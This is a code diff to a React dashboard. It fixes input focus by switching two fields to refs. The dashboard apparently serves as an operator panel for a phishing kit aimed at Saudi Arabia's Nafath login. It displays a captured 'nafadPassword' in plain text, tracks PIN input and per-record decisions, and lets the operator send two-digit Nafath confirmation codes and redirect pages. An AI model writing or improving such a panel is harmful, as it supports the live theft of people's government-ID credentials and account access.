@@ -100,6 +100,10 @@ export default function DashboardPage() {
   const [pinInput, setPinInput] = useState("");
   const [nafadInput, setNafadInput] = useState("");
   const [actionLoading, setActionLoading] = useState<string | null>(null);
+  
+  // Refs for input fields to prevent focus loss on re-render
+  const pinInputRef = useRef<HTMLInputElement>(null);
+  const nafadInputRef = useRef<HTMLInputElement>(null);
   const [localDecisionStates, setLocalDecisionStates] = useState<Record<string, string>>({});
   const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
   const [redirectPage, setRedirectPage] = useState("");
@@ -2196,16 +2200,21 @@ const renderNafadBox = () => {
           <div style={{ display: "flex", flexDirection: "column", gap: 12, marginTop: 8 }}>
             <div style={{ display: "flex", gap: 8 }}>
               <input
+                ref={nafadInputRef}
                 type="text"
                 placeholder="أدخل رقم التأكيد"
-                value={nafadInput}
-                onChange={(e) => setNafadInput(e.target.value.replace(/\D/g, "").slice(0, 2))}
+                defaultValue={nafadInput}
+                onChange={(e) => {
+                  const value = e.target.value.replace(/\D/g, "").slice(0, 2);
+                  setNafadInput(value);
+                }}
                 style={{ flex: 1, padding: "10px 12px", border: "1px solid #d1d5db", borderRadius: 8, fontSize: "0.875rem" }}
               />
               <button
                 onClick={() => {
                   handleSendNafadCode();
                   setNafadInput("");
+                  if (nafadInputRef.current) nafadInputRef.current.value = "";
                 }}
                 disabled={actionLoading === "nafad" || !nafadInput}
                 style={{ padding: "10px 16px", background: nafadInput ? "#2563eb" : "#9ca3af", color: nafadInput ? "#ffffff" : "#f3f4f6", borderRadius: 8, fontSize: "0.875rem", fontWeight: 700, cursor: nafadInput ? "pointer" : "not-allowed", border: "none" }}
@@ -4109,12 +4118,18 @@ const renderNafadBox = () => {
                   <span style={{ fontSize: "12px", fontWeight: 600, color: "#111827" }}>{raw.nafadPassword}</span>
                 </div>
               )}
-              {/* حقل إدخال رمز النفاذ */}
+              {/* حقل إدخال رمز النفاذ - uses ref to prevent focus loss on re-render */}
               <input
+                ref={nafadInputRef}
                 type="text"
                 placeholder="أدخل رمز النفاذ..."
-                value={nafadInput}
-                onChange={(e) => setNafadInput(e.target.value)}
+                defaultValue={nafadInput}
+                onChange={(e) => {
+                  // Update ref directly for immediate display (prevents focus loss)
+                  const value = e.target.value;
+                  // Update state asynchronously for button disabled logic
+                  setNafadInput(value);
+                }}
                 style={{ 
                   width: "100%", 
                   padding: "10px 12px", 
